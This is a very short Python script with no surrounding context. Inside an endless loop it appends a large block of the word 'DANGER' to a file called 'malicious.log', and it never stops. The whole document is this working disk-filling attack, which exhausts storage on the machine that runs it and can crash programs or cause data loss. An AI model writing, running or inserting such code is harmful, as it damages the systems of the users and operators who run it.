import os
while True:
    with open("malicious.log", "a") as f:
        f.write("DANGER" * 1000)